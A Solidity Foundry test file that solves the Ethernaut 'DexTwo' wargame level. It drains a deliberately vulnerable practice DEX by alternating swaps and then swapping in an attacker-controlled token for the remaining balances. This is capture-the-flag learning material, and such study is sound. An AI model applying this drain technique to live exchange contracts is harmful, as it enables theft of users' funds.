// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import { PRBTest } from "@prb/test/PRBTest.sol";
import { console } from "forge-std/console.sol";

import { Ethernaut } from "src/Ethernaut.sol";
import { DexTwo } from "src/DexTwo/DexTwo.sol";
import { DexTwoAttack } from "src/DexTwo/DexTwoAttack.sol";
import { SwappableTokenTwo } from "src/DexTwo/DexTwo.sol";
import { DexTwoFactory } from "src/DexTwo/DexTwoFactory.sol";

contract DexTwoAttackTest is PRBTest {
    Ethernaut public ethernaut;
    DexTwoFactory public factory;
    address public dextwoInstance;
    DexTwoAttack public attacker;
    address public playerAddress = address(0x696969);

    address public token1;
    address public token2;

    function setUp() public {
        vm.startPrank(playerAddress);
        vm.deal(playerAddress, 69 ether);
        ethernaut = new Ethernaut();
        factory = new DexTwoFactory();

        ethernaut.registerLevel(factory);
        dextwoInstance = ethernaut.createLevelInstance(factory);
        // create attacker with dextwo instance address
        attacker = new DexTwoAttack(dextwoInstance, playerAddress);
        // extract dex native tokens
        token1 = DexTwo(dextwoInstance).token1();
        token2 = DexTwo(dextwoInstance).token2();
        vm.stopPrank();
    }

    // test with withrawPartner set directly
    function testDexTwoAttack() public {
        uint256 tokenBalance;
        uint256 exchangeBalance;
        bool toggle;
        bool drained;

        vm.startPrank(playerAddress, playerAddress);

        while (!drained) {
            toggle ? swapToken(token1, token2) : swapToken(token2, token1);
            toggle = !toggle;
            drained = isDexHalfDrained();
        }

        // determine which token still has a balance
        address tokenWithDexBalance = SwappableTokenTwo(token1).balanceOf(dextwoInstance) > 0 ? token1 : token2;
        uint tokenWithDexBalanceBalance = SwappableTokenTwo(tokenWithDexBalance).balanceOf(dextwoInstance);
        console.log("tokenWithDexBalance BALANCE:", tokenWithDexBalanceBalance);
        // swap attack token for token with balance
        SwappableTokenTwo(token1).approve(playerAddress, dextwoInstance, tokenWithDexBalanceBalance);
        DexTwo(dextwoInstance).swap(tokenWithDexBalance, address(attacker), tokenWithDexBalanceBalance);
         
        // reset drained var
        drained = false;

        while (!drained) {
            toggle ? swapTokenAttacker(tokenWithDexBalance, address(attacker)) : swapToken(address(attacker), tokenWithDexBalance);
            toggle = !toggle;
            drained = isDexFullyDrained();
        }

        // // test to make sure we completed the level; submit level as player
        bool levelComplete = ethernaut.submitLevelInstance(payable(dextwoInstance));
        assert(levelComplete);
        vm.stopPrank();
    }

    function swapToken(address _tokenFrom, address _tokenTo) public {
        require(
            SwappableTokenTwo(token1).balanceOf(dextwoInstance) > 0 &&
                SwappableTokenTwo(token2).balanceOf(dextwoInstance) > 0,
            "Token Drained"
        );
        // get my balance and the exchange balance
        uint256 myTokenBalance = SwappableTokenTwo(_tokenFrom).balanceOf(playerAddress);
        uint256 exchangeBalance = SwappableTokenTwo(_tokenFrom).balanceOf(dextwoInstance);

        // determine how much to swap
        uint256 swapAmount;
        myTokenBalance >= exchangeBalance ? swapAmount = exchangeBalance : swapAmount = myTokenBalance;

        SwappableTokenTwo(_tokenFrom).approve(playerAddress, dextwoInstance, swapAmount);
        console.log("DEXTWO TOKEN 1 BALANCE BEFORE:", SwappableTokenTwo(token1).balanceOf(dextwoInstance));
        console.log("DEXTWO TOKEN 2 BALANCE BEFORE:", SwappableTokenTwo(token2).balanceOf(dextwoInstance));
        DexTwo(dextwoInstance).swap(_tokenFrom, _tokenTo, swapAmount);
        myTokenBalance = SwappableTokenTwo(_tokenFrom).balanceOf(playerAddress);
        console.log("DEXTWO TOKEN 1 BALANCE AFTER:", SwappableTokenTwo(token1).balanceOf(dextwoInstance));
        console.log("DEXTWO TOKEN 2 BALANCE AFTER:", SwappableTokenTwo(token2).balanceOf(dextwoInstance));
    }

    function swapTokenAttacker(address _tokenFrom, address _tokenTo) public {

        // get the exchange balance of token to rob
        uint256 exchangeBalance = SwappableTokenTwo(_tokenFrom).balanceOf(dextwoInstance);

        // // determine how much to swap
        // uint256 swapAmount;
        // myTokenBalance >= exchangeBalance ? swapAmount = exchangeBalance : swapAmount = myTokenBalance;

        SwappableTokenTwo(_tokenFrom).approve(playerAddress, dextwoInstance, exchangeBalance);
        SwappableTokenTwo(_tokenTo).approve(playerAddress, dextwoInstance, exchangeBalance);
        console.log("DEXTWO _tokenFrom BALANCE BEFORE:", SwappableTokenTwo(_tokenFrom).balanceOf(dextwoInstance));
        console.log("DEXTWO _tokenTo BALANCE BEFORE:", SwappableTokenTwo(_tokenTo).balanceOf(dextwoInstance));
        DexTwo(dextwoInstance).swap(_tokenFrom, _tokenTo, exchangeBalance);
        uint myTokenBalance = SwappableTokenTwo(_tokenFrom).balanceOf(playerAddress);
        console.log("DEXTWO _tokenFrom BALANCE AFTER:", SwappableTokenTwo(token1).balanceOf(dextwoInstance));
        console.log("DEXTWO _tokenTo BALANCE AFTER:", SwappableTokenTwo(token2).balanceOf(dextwoInstance));
    }

    function isDexHalfDrained() public returns (bool) {
        return
            SwappableTokenTwo(token1).balanceOf(dextwoInstance) == 0 ||
            SwappableTokenTwo(token2).balanceOf(dextwoInstance) == 0;
    }

    function isDexFullyDrained() public returns (bool) {
        return
            SwappableTokenTwo(token1).balanceOf(dextwoInstance) == 0 &&
            SwappableTokenTwo(token2).balanceOf(dextwoInstance) == 0;
    }
}
